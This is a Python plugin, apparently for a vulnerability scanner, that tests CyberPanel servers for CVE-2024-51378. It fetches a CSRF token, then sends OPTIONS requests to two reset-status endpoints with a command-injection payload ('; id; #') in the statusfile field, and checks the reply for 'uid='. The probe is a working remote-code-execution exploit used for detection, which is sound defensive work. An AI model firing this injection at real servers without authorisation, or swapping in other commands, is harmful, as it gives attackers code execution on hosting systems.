"""Agent Asteroid implementation for CVE-2024-51378"""

import re
import datetime
from urllib import parse as urlparse

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

DEFAULT_TIMEOUT = datetime.timedelta(seconds=90)
VULNERABILITY_TITLE = "CYBERPANEL RCE"
VULNERABILITY_REFERENCE = "CVE-2024-51378"
VULNERABILITY_DESCRIPTION = """A vulnerability in CyberPanel versions 2.3.5, 2.3.6, and 2.3.7 allowed remote code execution via 
improper handling of user-supplied input. Attackers could execute arbitrary commands using specially crafted payloads."""
RISK_RATING = "CRITICAL"

ALLOWED_ENDPOINTS = ["/ftp/getresetstatus", "/dns/getresetstatus"]


@exploits_registry.register
class CVE202451378Exploit(webexploit.WebExploit):
    accept_request = definitions.Request(method="GET", path="/")
    accept_pattern = [re.compile(r"Web Hosting Control Panel</h4>")]

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Rule to detect specific vulnerability on a specific target."""
        vulnerabilities: list[definitions.Vulnerability] = []

        try:
            csrf_token = self._get_csrf_token(target.origin)
            for endpoint in ALLOWED_ENDPOINTS:
                rce_result = self._attempt_rce(target.origin, csrf_token, endpoint)
                if rce_result is True:
                    vulnerability = self._create_vulnerability(target)
                    vulnerabilities.append(vulnerability)
                    break
        except requests_exceptions.RequestException:
            return vulnerabilities

        return vulnerabilities

    def _get_csrf_token(self, base_url: str) -> str:
        """Fetch the CSRF token from the server."""
        try:
            resp = self.session.get(base_url, timeout=DEFAULT_TIMEOUT.seconds)
            resp.raise_for_status()
            return resp.cookies.get("csrftoken", "")
        except requests_exceptions.RequestException as e:
            return ""

    def _attempt_rce(self, base_url: str, csrf_token: str, endpoint: str) -> bool:
        """Attempt to execute RCE on the target."""
        headers = {
            "X-CSRFToken": csrf_token,
            "Content-Type": "application/json",
            "Referer": base_url,
        }
        payload = '{"statusfile": "; id; #"}'
        try:
            target_url = urlparse.urljoin(base_url, endpoint)
            response = self.session.options(
                target_url,
                headers=headers,
                data=payload,
                timeout=DEFAULT_TIMEOUT.seconds,
            )
            return (
                response.json().get("requestStatus") is not None
                and "uid=" in response.text
            )
        except requests_exceptions.RequestException as e:
            return False
